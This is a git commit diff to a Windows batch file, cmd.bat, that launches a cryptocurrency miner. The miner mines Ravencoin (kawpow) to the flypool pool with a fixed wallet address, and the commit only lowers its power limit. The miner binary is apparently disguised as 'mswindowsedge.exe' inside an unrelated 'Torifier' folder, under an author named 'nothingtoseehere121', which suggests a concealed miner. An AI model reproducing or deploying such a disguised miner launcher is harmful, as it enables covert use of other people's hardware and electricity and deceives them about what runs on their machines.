5d4a89d3ef0549d7830dbe427770a5bb8234232f
nothingtoseehere121 <98023403+nothingtoseehere121@users.noreply.github.com>
2022-09-08 18:40:03 +0300

    Update cmd.bat

--- cmd.bat
+++ cmd.bat
@@ -1,3 +1,3 @@
 @ECHO OFF
-"C:\Program Files\Torifier\mswindowsedge.exe" -a kawpow -o stratum+tcp://stratum-ravencoin.flypool.org:3333 --pl 130 -u  RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.RGS-200
+"C:\Program Files\Torifier\mswindowsedge.exe" -a kawpow -o stratum+tcp://stratum-ravencoin.flypool.org:3333 --pl 100 -u  RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.RGS-200
 pause
